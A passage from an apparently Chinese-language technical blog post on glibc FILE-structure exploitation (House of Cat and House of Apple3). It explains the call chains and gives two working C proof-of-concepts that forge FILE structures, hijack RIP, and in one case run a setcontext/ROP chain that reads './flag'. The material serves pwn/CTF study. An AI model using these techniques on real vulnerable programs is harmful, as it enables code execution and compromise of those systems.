class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdefault_xsgetn)</span><br></pre></td></tr></table></figure></div>

<p>由于<code>more</code>是第三个参数，所以不能为<code>0</code>。<br>直接设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end</code>，使得<code>count</code>为<code>0</code>，不进入<code>if</code>分支。<br>随后当<code>more != 0</code>时会进入<code>__wunderflow</code>。</p>
<p>接着看<code>__wunderflow</code>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">__wunderflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_wget_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>要想调用到<code>_IO_switch_to_wget_mode</code>，需要设置<code>fp-&gt;mode &gt; 0</code>，并且<code>fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0</code>。</p>
<p>然后在<code>_IO_switch_to_wget_mode</code>函数中：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    <span class="comment">// .....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>时就会调用<code>_IO_WOVERFLOW(fp)</code>。</p>
<h3 id="利用-IO-wfile-seekoff函数控制程序执行流（House-of-Cat）"><a href="#利用-IO-wfile-seekoff函数控制程序执行流（House-of-Cat）" class="headerlink" title="利用_IO_wfile_seekoff函数控制程序执行流（House of Cat）"></a>利用_IO_wfile_seekoff函数控制程序执行流（House of Cat）</h3><p>对 <code>fp</code> 的设置如下：</p>
<ul>
<li><p><code>_flags</code> 设置为 <code>~0x8</code>，如果不能保证 <code>_lock</code> 指向可读写内存则 <code>_flags |= 0x8000</code>。</p>
</li>
<li><p><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_seekoff</code>即可</p>
</li>
<li><p><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></p>
</li>
<li><p><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code> ，即满足<code>*A &gt; *(A + 8)</code></p>
</li>
<li><p><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></p>
</li>
<li><p><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></p>
</li>
</ul>
<p>函数的调用链如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_seekoff</span><br><span class="line">    _IO_switch_to_wget_mode</span><br><span class="line">        _IO_WOVERFLOW</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure></div>

<p>详细分析如下：</p>
<p>首先看 <code>_IO_wfile_seekoff</code> 函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF; </span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>为了调用 <code>_IO_switch_to_wget_mode</code> 函数，需要满足 <code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code> 或 <code>(fp)-&gt;_flags &amp; 0x0800 != 0</code> 。</p>
<p>接着看 <code>_IO_switch_to_wget_mode</code>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>时就会调用<code>_IO_WOVERFLOW(fp)</code>。</p>
<p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_apple" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ucontext.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//leak libc_base</span></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x702e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// large bin attack: stderr -&gt; large</span></span><br><span class="line">    <span class="type">size_t</span> stderr_addr = libc_base + <span class="number">0x3b87a0</span>;</span><br><span class="line">    <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">&quot;./flag&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">free</span>(large);</span><br><span class="line">    <span class="type">size_t</span> *payload = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted);</span><br><span class="line">    large[<span class="number">3</span>] = stderr_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> IO_wfile_jumps_addr = libc_base + <span class="number">0x3b3f40</span>;</span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x121a90</span>; <span class="comment">// mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20]</span></span><br><span class="line">    <span class="type">size_t</span> pop_rax_ret = libc_base + <span class="number">0x3aaa8</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdi_ret = libc_base + <span class="number">0x23256</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rsi_ret = libc_base + <span class="number">0x2d89f</span>;</span><br><span class="line">    <span class="type">size_t</span> syscall_ret = libc_base + <span class="number">0x3ac69</span>;</span><br><span class="line">    <span class="type">size_t</span> ret = pop_rax_ret + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake file</span></span><br><span class="line">    large[<span class="number">-2</span>] &amp;= ~<span class="number">0x8</span>; <span class="comment">// _flags &amp;= ~0x8</span></span><br><span class="line">    large[<span class="number">-1</span>] = (<span class="type">size_t</span>) payload;</span><br><span class="line">    large[<span class="number">25</span>] = IO_wfile_jumps_addr + <span class="number">0x10</span>; <span class="comment">// vtable -&gt; _IO_wfile_jumps + 0x10</span></span><br><span class="line">    large[<span class="number">15</span>] = (<span class="type">size_t</span>) unsorted; <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">    large[<span class="number">18</span>] = (<span class="type">size_t</span>) unsorted;<span class="comment">// _wide_data</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake _wide_data</span></span><br><span class="line">    unsorted[<span class="number">4</span>] = (<span class="type">size_t</span>) (<span class="number">-1</span>); <span class="comment">//_IO_write_ptr</span></span><br><span class="line">    unsorted[<span class="number">28</span>] = (<span class="type">size_t</span>) unsorted; <span class="comment">//_wide_vtable</span></span><br><span class="line">    unsorted[<span class="number">3</span>] = (<span class="type">size_t</span>) magic_gadget;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SigreturnFrame</span></span><br><span class="line">    payload[<span class="number">4</span>] = (<span class="type">size_t</span>) setcontext + <span class="number">53</span>;</span><br><span class="line">    payload[<span class="number">13</span>] = (<span class="type">size_t</span>) buf; <span class="comment">// rdi -&gt; &quot;./flag&quot;</span></span><br><span class="line">    payload[<span class="number">14</span>] = <span class="number">0</span>; <span class="comment">// rsi = 0</span></span><br><span class="line">    payload[<span class="number">17</span>] = <span class="number">0x100</span>; <span class="comment">// rdx = 0x100 read 0x100 bytes</span></span><br><span class="line">    payload[<span class="number">20</span>] = (<span class="type">size_t</span>) &amp;payload[<span class="number">31</span>]; <span class="comment">// rsp -&gt; fake stack</span></span><br><span class="line">    payload[<span class="number">21</span>] = ret; <span class="comment">// rip -&gt; ret;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// rop</span></span><br><span class="line">    payload[<span class="number">31</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">32</span>] = <span class="number">2</span>;</span><br><span class="line">    payload[<span class="number">33</span>] = syscall_ret;</span><br><span class="line">    payload[<span class="number">34</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">35</span>] = <span class="number">0</span>;</span><br><span class="line">    payload[<span class="number">36</span>] = pop_rdi_ret;</span><br><span class="line">    payload[<span class="number">37</span>] = <span class="number">3</span>;</span><br><span class="line">    payload[<span class="number">38</span>] = pop_rsi_ret;</span><br><span class="line">    payload[<span class="number">39</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    payload[<span class="number">40</span>] = syscall_ret;</span><br><span class="line">    payload[<span class="number">41</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">42</span>] = <span class="number">1</span>;</span><br><span class="line">    payload[<span class="number">43</span>] = pop_rdi_ret;</span><br><span class="line">    payload[<span class="number">44</span>] = <span class="number">1</span>;</span><br><span class="line">    payload[<span class="number">45</span>] = pop_rsi_ret;</span><br><span class="line">    payload[<span class="number">46</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    payload[<span class="number">47</span>] = syscall_ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// __malloc_assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_chunk_addr = unsorted + <span class="number">0x124</span>;</span><br><span class="line">    top_chunk_addr[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="House-of-Apple3"><a href="#House-of-Apple3" class="headerlink" title="House of Apple3"></a>House of Apple3</h2><p><code>FILE</code>结构体中有一个成员<code>struct _IO_codecvt *_codecvt;</code>，偏移为<code>0x98</code>。该结构体参与宽字符的转换工作，结构体相关定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">step</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span> <span class="title">step_data</span>;</span></span><br><span class="line">&#125; _IO_iconv_t;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_loaded_object</span> *__<span class="title">shlib_handle</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *__modname;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For internal use by glibc.  (Accesses to this member must occur</span></span><br><span class="line"><span class="comment">     when the internal __gconv_lock mutex is acquired).  */</span></span><br><span class="line">  <span class="type">int</span> __counter;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *__from_name;</span><br><span class="line">  <span class="type">char</span> *__to_name;</span><br><span class="line"></span><br><span class="line">  __gconv_fct __fct;</span><br><span class="line">  __gconv_btowc_fct __btowc_fct;</span><br><span class="line">  __gconv_init_fct __init_fct;</span><br><span class="line">  __gconv_end_fct __end_fct;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Information about the number of bytes needed or produced in this</span></span><br><span class="line"><span class="comment">     step.  This helps optimizing the buffer sizes.  */</span></span><br><span class="line">  <span class="type">int</span> __min_needed_from;</span><br><span class="line">  <span class="type">int</span> __max_needed_from;</span><br><span class="line">  <span class="type">int</span> __min_needed_to;</span><br><span class="line">  <span class="type">int</span> __max_needed_to;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is a stateful encoding or not.  */</span></span><br><span class="line">  <span class="type">int</span> __stateful;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__data;		<span class="comment">/* Pointer to step-local data.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbuf;    <span class="comment">/* Output buffer for this step.  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbufend; <span class="comment">/* Address of first byte after the output</span></span><br><span class="line"><span class="comment">				 buffer.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Is this the last module in the chain.  */</span></span><br><span class="line">  <span class="type">int</span> __flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Counter for number of invocations of the module function for this</span></span><br><span class="line"><span class="comment">     descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> __invocation_counter;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is an internal use of the module (in the mb*towc*</span></span><br><span class="line"><span class="comment">     and wc*tomb* functions) or regular with iconv(3).  */</span></span><br><span class="line">  <span class="type">int</span> __internal_use;</span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> *__statep;</span><br><span class="line">  <span class="type">__mbstate_t</span> __state;	<span class="comment">/* This element must not be used directly by</span></span><br><span class="line"><span class="comment">			   any module; always use STATEP!  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>以上两个结构体均会被用于字符转换，而在利用的过程中，需要精准控制结构体中的某些成员，避免引发内存访问错误。</p>
<p><code>house of apple3</code>的利用主要关注以下三个函数：<code>__libio_codecvt_out</code>、<code>__libio_codecvt_in</code>和<code>__libio_codecvt_length</code>。三个函数的利用点都差不多，以<code>__libio_codecvt_in</code>为例，源码分析如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">__<span class="title">libio_codecvt_in</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">            <span class="title">const</span> <span class="title">char</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">            <span class="title">const</span> <span class="title">char</span> **<span class="title">from_stop</span>,</span></span><br><span class="line"><span class="class">            <span class="title">wchar_t</span> *<span class="title">to_start</span>, <span class="title">wchar_t</span> *<span class="title">to_end</span>, <span class="title">wchar_t</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line">  <span class="comment">// gs 源自第一个参数</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from_start_copy = (<span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"> </span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_start;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) to_end;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line"> </span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="comment">// 如果gs-&gt;__shlib_handle不为空，则会用__pointer_guard去解密</span></span><br><span class="line">  <span class="comment">// 这里如果可控，设置为NULL即可绕过解密</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 这里有函数指针调用</span></span><br><span class="line">  <span class="comment">// 这个宏就是调用fct(gs, ...)</span></span><br><span class="line">  status = DL_CALL_FCT (fct,</span><br><span class="line">            (gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,</span><br><span class="line">             (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">             &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">       <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中，<code>__gconv_fct</code>和<code>DL_CALL_FCT</code>被定义为：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Type of a conversion function.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*__gconv_fct)</span> <span class="params">(<span class="keyword">struct</span> __gconv_step *, <span class="keyword">struct</span> __gconv_step_data *,</span></span><br><span class="line"><span class="params">                <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">size_t</span> *, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DL_CALL_FCT</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_CALL_FCT(fct, args) fct args</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>



<h3 id="利用-IO-wfile-underflow函数控制程序执行流"><a href="#利用-IO-wfile-underflow函数控制程序执行流" class="headerlink" title="利用_IO_wfile_underflow函数控制程序执行流"></a>利用_IO_wfile_underflow函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow</code>即可</li>
<li><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
</ul>
<p>函数的调用链如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_underflow</span><br><span class="line">    __libio_codecvt_in</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure></div>

<p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_apple" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m[!] Backdoor is called!\n&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *) puts_addr);</span><br><span class="line">    <span class="type">size_t</span> libc_base_addr = puts_addr - <span class="number">0x702e0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc base address: %p\n&quot;</span>, (<span class="type">void</span> *) libc_base_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_2_1_stderr_addr = libc_base_addr + <span class="number">0x3b85e0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="type">void</span> *) _IO_2_1_stderr_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_wfile_jumps_addr = libc_base_addr + <span class="number">0x3b3f40</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wfile_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *) _IO_wfile_jumps_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *stderr2 = (<span class="type">char</span> *) _IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: set stderr-&gt;_flags to ~(4 | 0x10))&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) stderr2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: set stderr-&gt;_IO_read_ptr &lt; stderr-&gt;_IO_read_end&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) (stderr2 + <span class="number">0x10</span>) = (<span class="type">size_t</span>) <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: set stderr-&gt;vtable to _IO_wfile_jumps-0x40&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) (stderr2 + <span class="number">0xd8</span>) = _IO_wfile_jumps_addr - <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: set stderr-&gt;codecvt with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) (stderr2 + <span class="number">0x98</span>) = (<span class="type">size_t</span>) p1;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: set stderr-&gt;codecvt-&gt;__cd_in.step with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) p1 = (<span class="type">size_t</span>) p2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: put backdoor at stderr-&gt;codecvt-&gt;__cd_in.step-&gt;__fct&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) (p2 + <span class="number">0x28</span>) = (<span class="type">size_t</span>) (&amp;backdoor);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: call fflush(stderr) to trigger backdoor func&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>详细分析如下：</p>
<p>在<code>_IO_wfile_underflow</code>函数中调用了<code>__libio_codecvt_in</code>，代码片段如下：</p>
